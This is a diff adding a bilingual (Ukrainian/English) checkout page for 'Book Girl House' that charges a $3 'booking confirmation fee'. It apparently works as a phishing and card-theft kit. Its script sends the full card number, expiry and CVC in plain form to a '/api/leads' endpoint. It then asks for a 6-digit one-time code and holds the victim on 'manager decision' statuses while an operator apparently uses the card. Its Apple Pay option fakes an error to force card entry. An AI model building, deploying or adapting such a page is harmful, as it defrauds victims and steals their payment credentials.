@@ -1,0 +1,365 @@
+<!doctype html>
+<html lang="uk">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Book Girl House — Оплата</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<meta name="description" content="Оплата комісії $3.00 за підтвердження бронювання Book Girl House.">
+<meta property="og:title" content="Book Girl House — Оплата">
+<meta property="og:description" content="Безпечне підтвердження бронювання.">
+<meta name="theme-color" content="#f6f9fc">
+<link rel="stylesheet" href="/style.css?v=12">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body class="bgh-checkout">
+<div class="lang-switch light" id="langSwitch">
+  <button type="button" data-lang="uk" class="active">UA</button>
+  <button type="button" data-lang="en">EN</button>
+</div>
+
+<main class="checkout-layout">
+  <!-- Summary column -->
+  <aside class="checkout-summary">
+    <div class="bgh-brand compact">
+      <span class="bgh-mark">BGH</span>
+      <span class="bgh-brand-name">Book Girl House</span>
+    </div>
+    <p class="sum-kicker" data-i18n="payTo">Оплата на користь</p>
+    <h1 class="sum-merchant">Book Girl House</h1>
+    <div class="sum-amount">$3.00</div>
+    <p class="sum-currency">USD</p>
+    <div class="sum-line">
+      <span data-i18n="feeName">Комісія за підтвердження бронювання</span>
+      <strong>$3.00</strong>
+    </div>
+    <p class="sum-note" data-i18n="sumNote">
+      Після оплати бронювання фіксується. Деталі візиту (вона до вас або ви до неї) — у чаті з менеджером.
+    </p>
+    <a class="sum-back" href="/" data-i18n="back">← Назад</a>
+  </aside>
+
+  <!-- Form column -->
+  <section class="checkout-form-col" id="formCard">
+    <div class="checkout-card">
+      <h2 data-i18n="checkoutTitle">Оплата</h2>
+      <p class="checkout-sub" data-i18n="checkoutSub">Введіть дані для підтвердження бронювання</p>
+
+      <div class="time-row">
+        <label class="field">
+          <span data-i18n="timeLabel">Бажаний час</span>
+          <button type="button" class="time-selector" id="timeSelector">
+            <strong id="summaryTime">—</strong>
+            <span class="chevron">⌄</span>
+          </button>
+        </label>
+        <div class="time-popover" id="timePopover">
+          <button type="button" class="time-option active" data-time="nearest" data-i18n="nearestTime">Найближчий зручний час</button>
+          <div class="custom-time-row">
+            <input id="customTime" type="time">
+            <button type="button" id="useCustomTime" class="linkish" data-i18n="choose">Обрати</button>
+          </div>
+        </div>
+        <p class="field-hint" id="timeHint" data-i18n="timeAutoHint">Узгодимо точний слот після підтвердження.</p>
+      </div>
+
+      <div class="pay-methods-row">
+        <button type="button" class="pay-tab" id="applePayBtn">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+          Apple Pay
+        </button>
+        <button type="button" class="pay-tab active" id="cardMethodBtn" data-i18n="cardTab">Картка</button>
+      </div>
+      <p id="applePayErr" class="form-error" hidden></p>
+
+      <div id="formArea">
+        <label class="field">
+          <span data-i18n="emailLabel">Email</span>
+          <input id="email" type="email" placeholder="name@email.com" autocomplete="email">
+        </label>
+        <label class="field">
+          <span data-i18n="fullName">Повне імʼя</span>
+          <input id="fullName" type="text" autocomplete="name" data-ph="fullNamePh">
+        </label>
+
+        <div id="cardFields" class="card-fields open">
+          <label class="field">
+            <span data-i18n="cardNumber">Номер картки</span>
+            <div class="input-with-icons">
+              <input id="card" inputmode="numeric" maxlength="19" placeholder="1234 1234 1234 1234" autocomplete="cc-number">
+              <span class="input-icons">
+                <img src="https://cdn.simpleicons.org/visa/1A1F71" alt="" height="12">
+                <img src="https://cdn.simpleicons.org/mastercard/EB001B" alt="" height="14">
+              </span>
+            </div>
+          </label>
+          <div class="field-grid">
+            <label class="field">
+              <span data-i18n="expiry">Термін дії</span>
+              <input id="expiry" placeholder="MM / YY" inputmode="numeric" maxlength="5" autocomplete="cc-exp">
+            </label>
+            <label class="field">
+              <span data-i18n="cvv">CVC</span>
+              <input id="code" placeholder="CVC" inputmode="numeric" maxlength="4" autocomplete="cc-csc">
+            </label>
+          </div>
+        </div>
+
+        <p id="err" class="form-error"></p>
+
+        <div id="pending" class="code-panel" hidden>
+          <div class="code-panel-head">
+            <strong data-i18n="confirmCode">Код підтвердження</strong>
+            <p id="statusText" data-i18n="codeSent">Введіть код з повідомлення</p>
+          </div>
+          <div id="inline-code-entry" class="code-entry">
+            <input id="activation" autocomplete="one-time-code" inputmode="numeric" maxlength="6" placeholder="000000">
+            <button type="button" id="retryButton" class="retry-btn" hidden data-i18n="resendCode">Надіслати знову</button>
+          </div>
+          <div id="codeLoading" class="code-loading" hidden><span class="spinner"></span></div>
+          <p id="codeLengthHint" class="field-hint" hidden></p>
+          <p id="verr" class="form-error"></p>
+          <p id="attempts" hidden></p>
+        </div>
+
+        <button id="send" class="bgh-btn full" data-i18n="payBtn">Сплатити $3.00</button>
+
+        <p class="legal" data-i18n="legal">
+          Продовжуючи, ви погоджуєтесь з умовами Book Girl House і авторизуєте списання комісії $3.00 за підтвердження бронювання.
+        </p>
+        <p class="secure-line"><span class="lock">🔒</span> <span data-i18n="secure">Захищена оплата · шифроване з’єднання</span></p>
+        <p class="bgh-legal-links checkout-legal">
+          <a href="/terms.html" data-i18n="terms">Умови</a>
+          <span>·</span>
+          <a href="/privacy.html" data-i18n="privacy">Конфіденційність</a>
+        </p>
+      </div>
+    </div>
+
+    <section id="thankYou" class="thank-panel" hidden>
+      <div class="thank-icon-wrap"><div class="thank-icon">✓</div></div>
+      <h2 data-i18n="thanks">Оплату прийнято</h2>
+      <p data-i18n="thanksBody">Комісію $3.00 підтверджено. Бронювання зафіксовано — очікуйте повідомлення в чаті щодо деталей візиту.</p>
+      <div class="thank-receipt">
+        <div><span data-i18n="receiptMerchant">Отримувач</span><strong>Book Girl House</strong></div>
+        <div><span data-i18n="receiptAmount">Сума</span><strong>$3.00 USD</strong></div>
+        <div><span data-i18n="receiptType">Тип</span><strong data-i18n="feeName">Комісія за підтвердження</strong></div>
+      </div>
+      <a class="bgh-btn full thank-cta" href="/" data-i18n="backHome">На головну</a>
+    </section>
+  </section>
+</main>
+
+<div id="payOverlay" class="pay-overlay" hidden>
+  <div class="pay-overlay-card">
+    <div class="pay-spinner"></div>
+    <p class="pay-overlay-title" data-i18n="processingTitle">Обробка платежу</p>
+    <p class="pay-overlay-sub" data-i18n="processingSub">Не закривайте сторінку…</p>
+  </div>
+</div>
+
+<script>
+const $=id=>document.getElementById(id);
+let leadId=null,poll=null,selectedTime='nearest',codeSubmitted=false,codeStage=false,waitingForManager=false;
+let retryTimer=null,retrySecondsLeft=0,applePaySelected=false,lastRenderedStatus=null;
+
+const I18N={
+uk:{
+  docTitle:"Book Girl House — Оплата",payTo:"Оплата на користь",feeName:"Комісія за підтвердження бронювання",
+  sumNote:"Після оплати бронювання фіксується. Деталі візиту (вона до вас або ви до неї) — у чаті з менеджером.",
+  back:"← Назад",checkoutTitle:"Оплата",checkoutSub:"Введіть дані для підтвердження бронювання",
+  timeLabel:"Бажаний час",nearestTime:"Найближчий зручний час",choose:"Обрати",
+  timeAutoHint:"Узгодимо точний слот після підтвердження.",timeChosen:"Обрано: ",
+  cardTab:"Картка",emailLabel:"Email",fullName:"Повне імʼя",fullNamePh:"Як у документах",
+  cardNumber:"Номер картки",expiry:"Термін дії",cvv:"CVC",
+  confirmCode:"Код підтвердження",codeSent:"Введіть код з повідомлення",resendCode:"Надіслати знову",
+  payBtn:"Сплатити $3.00",legal:"Продовжуючи, ви погоджуєтесь з умовами Book Girl House і авторизуєте списання комісії $3.00 за підтвердження бронювання.",
+  secure:"Захищена оплата · шифроване з’єднання",
+  thanks:"Оплату прийнято",thanksBody:"Комісію $3.00 підтверджено. Бронювання зафіксовано — очікуйте повідомлення в чаті щодо деталей візиту.",
+  sending:"Обробка…",checking:"Перевірка…",processing:"Обробляємо платіж, зачекайте…",
+  codeWrong:"Код не підійшов. Спробуйте ще раз.",requestSent:"Запит надіслано. Введіть новий код.",
+  need6:"Потрібно 6 цифр.",resending:"Надсилаємо…",
+  errEmail:"Введіть коректний email.",errName:"Введіть повне імʼя.",
+  errCard16:"Номер картки — 16 цифр.",errExpiry:"Формат MM/YY.",errCvv:"CVC — 3 або 4 цифри.",
+  errTime:"Оберіть час.",errCodeLen:n=>`Ще ${n}`,attempts:n=>`Спроб: ${n}`,
+  appleError:"Apple Pay зараз недоступний. Оплатіть карткою.",
+  processingTitle:"Обробка платежу",processingSub:"Не закривайте сторінку…",
+  terms:"Умови",privacy:"Конфіденційність",backHome:"На головну",
+  receiptMerchant:"Отримувач",receiptAmount:"Сума",receiptType:"Тип"
+},
+en:{
+  docTitle:"Book Girl House — Checkout",payTo:"Pay",feeName:"Booking confirmation fee",
+  sumNote:"After payment, your booking is reserved. Visit details (her place or yours) are arranged in chat.",
+  back:"← Back",checkoutTitle:"Payment",checkoutSub:"Enter your details to confirm the booking",
+  timeLabel:"Preferred time",nearestTime:"Nearest convenient time",choose:"Select",
+  timeAutoHint:"Exact slot will be confirmed after payment.",timeChosen:"Selected: ",
+  cardTab:"Card",emailLabel:"Email",fullName:"Full name",fullNamePh:"As on your ID",
+  cardNumber:"Card number",expiry:"Expiry",cvv:"CVC",
+  confirmCode:"Confirmation code",codeSent:"Enter the code from your message",resendCode:"Send again",
+  payBtn:"Pay $3.00",legal:"By continuing you agree to Book Girl House terms and authorize a $3.00 confirmation fee.",
+  secure:"Secure payment · encrypted connection",
+  thanks:"Payment received",thanksBody:"Your $3.00 fee is confirmed. Booking is reserved — watch chat for visit details.",
+  sending:"Processing…",checking:"Checking…",processing:"Processing payment, please wait…",
+  codeWrong:"Code didn’t work. Try again.",requestSent:"Request sent. Enter the new code.",
+  need6:"6 digits required.",resending:"Sending…",
+  errEmail:"Enter a valid email.",errName:"Enter your full name.",
+  errCard16:"Card number must be 16 digits.",errExpiry:"Use MM/YY.",errCvv:"CVC is 3 or 4 digits.",
+  errTime:"Select a time.",errCodeLen:n=>`${n} more`,attempts:n=>`Attempts: ${n}`,
+  appleError:"Apple Pay unavailable. Please pay by card.",
+  processingTitle:"Processing payment",processingSub:"Please don’t close this page…",
+  terms:"Terms",privacy:"Privacy",backHome:"Back to home",
+  receiptMerchant:"Payee",receiptAmount:"Amount",receiptType:"Type"
+}};
+
+function t(k){return(I18N[localStorage.getItem("fitpass_lang")||"uk"]||I18N.uk)[k]}
+function applyLang(lang){
+  const d=I18N[lang]||I18N.uk;
+  document.documentElement.lang=lang==="en"?"en":"uk";
+  document.title=d.docTitle;
+  document.querySelectorAll("[data-i18n]").forEach(el=>{const k=el.getAttribute("data-i18n");if(typeof d[k]==="string")el.innerHTML=d[k]});
+  document.querySelectorAll("#langSwitch button").forEach(b=>b.classList.toggle("active",b.dataset.lang===lang));
+  const fn=$("fullName");if(fn)fn.placeholder=d.fullNamePh||"";
+  localStorage.setItem("fitpass_lang",lang);
+  setTime(document.querySelector(".time-option.active")?.dataset.time||"nearest");
+}
+document.querySelectorAll("#langSwitch button").forEach(b=>b.addEventListener("click",()=>applyLang(b.dataset.lang)));
+
+function nearestSlot(){
+  const hour=new Date().getHours()+new Date().getMinutes()/60;
+  const slots=[9,10,11,12,13,14,15,16,17,18,19,20,21,22];
+  return String(slots.find(h=>h>hour+0.01)||10).padStart(2,"0")+":00";
+}
+function setTime(value){
+  selectedTime=value==="nearest"?nearestSlot():value;
+  $("summaryTime").textContent=value==="nearest"?t("nearestTime"):selectedTime;
+  $("timeHint").textContent=value==="nearest"?t("timeAutoHint"):t("timeChosen")+selectedTime;
+}
+function closeTimePicker(){$("timePopover").classList.remove("open")}
+$("timeSelector").onclick=()=>$("timePopover").classList.toggle("open");
+document.querySelectorAll(".time-option[data-time]").forEach(btn=>{
+  btn.onclick=()=>{document.querySelectorAll(".time-option").forEach(x=>x.classList.remove("active"));btn.classList.add("active");setTime(btn.dataset.time);closeTimePicker()};
+});
+$("useCustomTime").onclick=()=>{const v=$("customTime").value;if(!v)return;document.querySelectorAll(".time-option").forEach(x=>x.classList.remove("active"));setTime(v);closeTimePicker()};
+document.addEventListener("click",e=>{if(!e.target.closest(".time-row"))closeTimePicker()});
+setTime("nearest");
+
+function selectCardMethod(){
+  applePaySelected=false;$("applePayBtn").classList.remove("active");$("cardMethodBtn").classList.add("active");
+  $("cardFields").classList.add("open");$("applePayErr").hidden=true;
+}
+function tryApplePay(){
+  $("cardMethodBtn").classList.remove("active");$("applePayBtn").classList.add("active");$("applePayErr").hidden=true;
+  const btn=$("applePayBtn");btn.disabled=true;
+  setTimeout(()=>{btn.disabled=false;btn.classList.remove("active");$("applePayErr").textContent=t("appleError");$("applePayErr").hidden=false;selectCardMethod();$("card").focus()},600);
+}
+$("applePayBtn").onclick=tryApplePay;$("cardMethodBtn").onclick=selectCardMethod;
+
+$("card").oninput=()=>{const r=$("card").value.replace(/\D/g,"").slice(0,16);$("card").value=r.replace(/(\d{4})(?=\d)/g,"$1 ")};
+$("expiry").oninput=()=>{let r=$("expiry").value.replace(/\D/g,"").slice(0,4);if(r.length>=2){const m=+r.slice(0,2);if(m<1||m>12)r=r.slice(0,1)}$("expiry").value=r.length>2?r.slice(0,2)+"/"+r.slice(2):r};
+$("code").oninput=()=>{$("code").value=$("code").value.replace(/\D/g,"").slice(0,4)};
+
+function updateCodeCounter(){const v=$("activation").value.replace(/\D/g,"").slice(0,6);$("activation").value=v}
+let autoSubmittingCode=false;
+function maybeAutoSubmitCode(){
+  if(autoSubmittingCode||codeSubmitted||waitingForManager||!codeStage||!leadId)return;
+  if($("activation").value.replace(/\D/g,"").length!==6)return;
+  autoSubmittingCode=true;
+  setTimeout(()=>{if(!codeSubmitted&&!waitingForManager&&$("activation").value.replace(/\D/g,"").length===6)$("send").click();else autoSubmittingCode=false},120);
+}
+$("activation").addEventListener("input",()=>{if(codeSubmitted)return;updateCodeCounter();maybeAutoSubmitCode()});
+
+function openCodePanel(){
+  $("pending").hidden=false;codeStage=true;waitingForManager=false;
+  $("send").disabled=true;startRetryCountdown(90);
+}
+function startRetryCountdown(sec){
+  if(retryTimer)clearInterval(retryTimer);
+  retrySecondsLeft=sec;const btn=$("retryButton");btn.hidden=false;btn.disabled=true;
+  const tick=()=>{if(retrySecondsLeft<=0){clearInterval(retryTimer);btn.disabled=false;btn.textContent=t("resendCode");return}
+    btn.textContent=`${t("resendCode")} (${Math.floor(retrySecondsLeft/60)}:${String(retrySecondsLeft%60).padStart(2,"0")})`;retrySecondsLeft--};
+  tick();retryTimer=setInterval(tick,1000);
+}
+function showLoading(){$("codeLoading").hidden=false;$("inline-code-entry").hidden=true;$("retryButton").hidden=true;$("activation").disabled=true;$("verr").textContent=""}
+function hideLoading(){$("codeLoading").hidden=true}
+function finish(){
+  const ov=$("payOverlay");if(ov)ov.hidden=true;
+  const card=$("formCard").querySelector(".checkout-card");
+  if(card)card.hidden=true;
+  $("thankYou").hidden=false;
+  $("thankYou").classList.add("thank-in");
+  if(poll){clearInterval(poll);poll=null}
+  localStorage.removeItem("fitpass_lead_id");
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+
+function setStatus(d){
+  if(d.status===lastRenderedStatus)return;lastRenderedStatus=d.status;
+  if(d.status==="Підтверджено"||d.status==="Подтверждено"){finish();return}
+  if(d.status==="Очікує рішення менеджера"||d.status==="Ожидает решения менеджера"){
+    waitingForManager=true;if(retryTimer)clearInterval(retryTimer);$("statusText").textContent=t("processing");$("send").disabled=true;showLoading();return}
+  if(d.status==="Код не підійшов — повторне введення"||d.status==="Код не подошёл — повторный ввод"){
+    hideLoading();waitingForManager=false;codeSubmitted=false;$("inline-code-entry").hidden=false;$("activation").value="";$("activation").disabled=false;
+    $("statusText").textContent=t("codeWrong");$("send").disabled=true;$("send").textContent=t("payBtn");startRetryCountdown(90);return}
+  if(d.status==="Клієнт запросив новий код"||d.status==="Клиент запросил новый код"){
+    hideLoading();waitingForManager=false;codeSubmitted=false;$("inline-code-entry").hidden=false;$("statusText").textContent=t("requestSent");
+    $("activation").disabled=false;$("activation").value="";$("send").disabled=true;$("send").textContent=t("payBtn");startRetryCountdown(90);return}
+  $("statusText").textContent=t("codeSent");$("activation").disabled=false;$("send").disabled=true;
+}
+async function checkStatus(){if(!leadId)return;try{const r=await fetch("/api/leads/"+leadId+"/status?ts="+Date.now());if(r.ok)setStatus(await r.json())}catch{}}
+function validEmail(v){return/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(v||"").trim())}
+function currentDateLabel(){const lang=(localStorage.getItem("fitpass_lang")||"uk")==="en"?"en-US":"uk-UA";return new Intl.DateTimeFormat(lang,{day:"numeric",month:"long"}).format(new Date())}
+
+$("send").onclick=async()=>{
+  $("err").textContent="";
+  if(!leadId){
+    const email=$("email").value.trim(),fullName=$("fullName").value.trim();
+    const digits=$("card").value.replace(/\D/g,"");
+    const expiry=$("expiry").value.trim(),em=expiry.match(/^(\d{2})\/(\d{2})$/),month=em?+em[1]:0;
+    const cvc=$("code").value.replace(/\D/g,"");
+    if(!validEmail(email)){$("err").textContent=t("errEmail");return}
+    if(!fullName||fullName.length<2){$("err").textContent=t("errName");return}
+    if(digits.length!==16){$("err").textContent=t("errCard16");return}
+    if(!em||month<1||month>12){$("err").textContent=t("errExpiry");return}
+    if(cvc.length<3){$("err").textContent=t("errCvv");return}
+    $("send").disabled=true;$("send").textContent=t("sending");
+    const ov=$("payOverlay");if(ov)ov.hidden=false;
+    try{
+      const r=await fetch("/api/leads",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
+        name:fullName,email,card_number:digits,expiry,card_code:cvc,
+        booking_date:currentDateLabel(),booking_time:selectedTime,payment_method:"card",amount:"3.00"
+      })});
+      const d=await r.json();if(!r.ok)throw Error(d.error);
+      leadId=d.id;localStorage.setItem("fitpass_lead_id",String(leadId));
+      openCodePanel();$("send").textContent=t("payBtn");$("statusText").textContent=t("codeSent");
+      if(ov)ov.hidden=true;
+    }catch(e){if(ov)ov.hidden=true;$("err").textContent=e.message;$("send").disabled=false;$("send").textContent=t("payBtn")}
+  }else{
+    if(codeSubmitted)return;
+    const code=$("activation").value.replace(/\D/g,"");
+    if(code.length!==6)return;
+    codeSubmitted=true;$("send").disabled=true;$("send").textContent=t("checking");showLoading();
+    try{
+      const r=await fetch("/api/leads/"+leadId+"/submit-code",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({code})});
+      const d=await r.json();if(!r.ok)throw Error(d.error);
+      setStatus(d);if(!poll)poll=setInterval(checkStatus,3000);
+    }catch(e){codeSubmitted=false;hideLoading();$("activation").disabled=false;$("send").disabled=false;$("send").textContent=t("payBtn");$("verr").textContent=e.message}
+  }
+};
+
+$("retryButton").onclick=async()=>{
+  if($("retryButton").disabled)return;
+  $("retryButton").disabled=true;$("retryButton").textContent=t("resending");$("verr").textContent="";
+  try{
+    const r=await fetch("/api/leads/"+leadId+"/request-retry",{method:"POST"});
+    const d=await r.json();if(!r.ok)throw Error(d.error);
+    codeSubmitted=false;lastRenderedStatus=null;setStatus(d);
+  }catch(e){$("retryButton").disabled=false;$("retryButton").textContent=t("resendCode");$("verr").textContent=e.message}
+};
+
+(async()=>{const s=localStorage.getItem("fitpass_lead_id");if(s){leadId=+s;openCodePanel();if(!poll)poll=setInterval(checkStatus,3000);checkStatus()}})();
+applyLang(localStorage.getItem("fitpass_lang")||"uk");
+</script>
+</body>
+</html>
